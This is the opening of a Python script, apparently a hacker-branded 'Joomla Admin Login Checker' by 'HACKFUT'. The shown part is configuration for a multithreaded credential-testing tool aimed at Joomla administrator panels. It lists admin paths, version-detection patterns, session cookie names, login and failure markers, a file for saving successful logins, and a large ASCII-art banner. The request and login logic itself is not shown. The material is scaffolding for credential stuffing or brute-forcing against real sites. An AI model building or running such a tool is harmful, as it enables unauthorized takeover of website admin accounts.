#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Joomla Admin Login Checker - ULTIMATE VERSION
Author: HACKFUT

FEATURES (combinaison des 2 codes):
  1. MULTI-VERSION LOGIN (1.0 → 5.x) avec version-specific payload
  2. MULTI-PAYLOAD STRATEGY (5-6 payloads essayés par credential)
  3. VERSION-AWARE COOKIES (jos_session vs joomla_user_state)
  4. VERSION-AWARE PATHS (index2.php vs index.php)
  5. VERSION-AWARE ADMIN MARKERS
  6. ADAPTIVE THRESHOLD (2 markers pour vieux, 3 pour moderne)
  7. MULTI-PATH VERIFICATION (5-6 chemins protégés)
  8. ANTI-FAUX-POSITIFS strict
"""

import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse

import requests
import urllib3
from colorama import Fore, Style, init

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ═══════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ═══════════════════════════════════════════════════════════════════

MAX_THREADS = 10
SUCCESS_FILE = "successful_logins.txt"
FAILED_FILE = "failed_logins.txt"

print_lock = threading.Lock()


# ═══════════════════════════════════════════════════════════════════
#  ADMIN PATHS
# ═══════════════════════════════════════════════════════════════════

ADMIN_PATHS = [
    "/administrator/index.php",
    "/administrator/",
    "/administrator/index2.php",
    "/admin/index.php",
    "/admin/",
    "/joomla/administrator/index.php",
    "/cms/administrator/index.php",
    "/site/administrator/index.php",
]


# ═══════════════════════════════════════════════════════════════════
#  PROTECTED PATHS (default for modern Joomla)
# ═══════════════════════════════════════════════════════════════════

DEFAULT_PROTECTED_PATHS = [
    "/administrator/index.php?option=com_users&view=users",
    "/administrator/index.php?option=com_config",
    "/administrator/index.php?option=com_users&task=view",
    "/administrator/index.php?option=com_content",
    "/administrator/index.php?option=com_media",
    "/administrator/index.php",
]


# ═══════════════════════════════════════════════════════════════════
#  VERSION PATTERNS
# ═══════════════════════════════════════════════════════════════════

VERSION_PATTERNS = [
    (r"joomla!?\s*5[.\s]", "5.x"),
    (r'Joomla\.version\s*=\s*["\']5', "5.x"),
    (r'content=["\']Joomla!?\s*5\.(\d+)', "5.x"),
    (r"joomla!?\s*4[.\s]", "4.x"),
    (r'Joomla\.version\s*=\s*["\']4', "4.x"),
    (r'content=["\']Joomla!?\s*4\.(\d+)', "4.x"),
    (r"joomla!?\s*3[.\s]", "3.x"),
    (r'Joomla\.version\s*=\s*["\']3', "3.x"),
    (r'content=["\']Joomla!?\s*3\.(\d+)', "3.x"),
    (r"joomla!?\s*2\.5", "2.5"),
    (r"joomla!?\s*1\.7", "1.7"),
    (r"joomla!?\s*1\.6", "1.6"),
    (r"joomla!?\s*1\.5", "1.5"),
    (r"\bjos_[a-z_]+", "1.5"),
    (r"joomla!?\s*1\.0", "1.0"),
    (r"\bmos_[a-z_]+", "1.0"),
    (r"\bMambo\b", "1.0"),
]


# ═══════════════════════════════════════════════════════════════════
#  VERSION-SPECIFIC COOKIES
# ═══════════════════════════════════════════════════════════════════

VERSION_COOKIES = {
    "1.0": ["sessioncookie", "jos_session"],
    "1.5": ["jos_session", "sessioncookie", "jos_authtoken"],
    "1.6": ["jos_session", "sessioncookie"],
    "1.7": ["jos_session", "sessioncookie"],
    "2.5": ["jos_session", "sessioncookie"],
    "3.x": ["joomla_user_state", "jos_session"],
    "4.x": ["joomla_user_state"],
    "5.x": ["joomla_user_state"],
    "Unknown": [
        "joomla_user_state",
        "jos_session",
        "sessioncookie",
        "jos_authtoken",
        "jsessionid",
    ],
}


# ═══════════════════════════════════════════════════════════════════
#  VERSION-SPECIFIC ADMIN MARKERS
# ═══════════════════════════════════════════════════════════════════

VERSION_ADMIN_MARKERS = {
    "1.0": ["index2.php", "mosconfig", "mambo", "administrator",
            "com_admin", "com_content"],
    "1.5": ["index2.php", "com_cpanel", "com_content", "com_users",
            "com_menus", "com_modules", "com_config", "jos_",
            "logout", "task=logout", "control panel", "logged in"],
    "1.6": ["com_cpanel", "com_content", "com_users", "task=logout",
            "quickicons"],
    "1.7": ["com_cpanel", "com_content", "com_users", "task=logout"],
    "2.5": ["com_cpanel", "com_content", "com_users", "task=logout"],
    "3.x": ["com_cpanel", "com_content", "com_users", "task=logout",
            "quickicons"],
    "4.x": ["com_cpanel", "com_content", "com_users", "task=logout",
            "dashboard"],
    "5.x": ["com_cpanel", "com_content", "com_users", "task=logout",
            "dashboard"],
    "Unknown": ["com_cpanel", "com_content", "com_users", "task=logout",
                "quickicons", "index2.php", "jos_"],
}


# ═══════════════════════════════════════════════════════════════════
#  LOGIN / FAILURE MARKERS
# ═══════════════════════════════════════════════════════════════════

LOGIN_PAGE_MARKERS = [
    "mod-login-username",
    "mod-login-password",
    "form-login",
    "com_login",
    "task=login",
    "task=user.login",
    'name="passwd"',
    'name="password"',
    "joomla-login",
    "login-form",
]

FAILURE_MARKERS = [
    "username and password do not match",
    "you do not have an account",
    "invalid password",
    "authentication failed",
    "login failed",
    "incorrect username",
    "user does not exist",
    "usuario y contraseña no coinciden",
    "contraseña incorrecta",
]


# ═══════════════════════════════════════════════════════════════════
#  BANNER
# ═══════════════════════════════════════════════════════════════════

BANNER = r"""
                                                                                          
⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⡟⠀⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⢘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⡇⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⡇⣿⠰⡀⠈⠄⠀⠀⠀⠀⠀⠀⠀⢳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣇⢻⡇⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠾⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣄⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠠⠀⠀⠀⠀⠀⠀⠡⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⣄⠀⠀⠀⠀⠀⠘⠆⠀⠈⢿⣦⠀⠀⠠⠀⠀⠀⠀⠀⢰⣶⣶⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⡶⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡄⠀⠀⠀⠀⠀⠀⠘⣦⣀⠀⠀⠀⢠⣀⠀⠀⠈⠳⠦⠀⠀⠀⠀⠀⠀⠐⠀⢻⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⡿⠃⠜⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣇⠀⠀⠀⣷⣄⠀⠀⠈⠛⢷⣶⣤⡄⠙⠳⠦⣤⡀⠈⠀⠀⠀⡀⠸⣤⣄⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⠟⢠⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠈⠻⠷⠆⢰⣿⣿⣷⣤⡀⠈⠻⣿⣿⣿⣦⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠠⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⡿⢃⣴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢶⣶⣄⠄⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠉⠀⢀⣠⣴⣶⣶⣶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠋⣰⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣦⡀⢀⣾⣄⠠⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀
⣡⣿⣿⠃⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⢰⡿⢋⣴⣿⣿⣿⣿⣦⣤⡹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡁⠀⠈⠉⠛⠛⠿⣿⣷⣀⡐⠠⠷⣼⠂⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣉⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⡛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣴⣆⣠⡀⠀⠀⠉⠛⠛⠛⠋⠉⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀
⣿⡡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⢌⡛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣦⣄⣀⣀⡠⠀⡤⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡻⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⢀⣤⣄⣠⣴⠟⢁⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡛⢿⣿⣿⣿⣴⣿⣿⣿⠟⣁⠔⣫⣴⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡠⠀⠀⡐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡉⢿⡿⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣀⡂⠉⢛⠻⠿⢋⠥⢊⣡⣾⣿⣷⡄⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡔⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣆⣻⣿⣷⣬⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣌⣒⠂⠭⠍⠛⠻⢿⠃⠀⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⡜⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⣴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠘⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡾⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣦⣌⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣶⣄⡙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢠⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⡇⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⣶⣬⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠋⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⠀⠀⣀⣠⣴⣶⡶⠃⠐⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠟⠋⠉⣁⣠⣤⣶⣶⣿⣿⣿⣿⡟⢡⡆⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⠛⠛⠉⠉⠀⠀⠀⠀⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⡇⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡆⠀⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⡿⠛⢉⠤⠂⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀
⣠⡆⠀⠗⠀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⡠⢊⣡⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿
⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿
⠋⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿
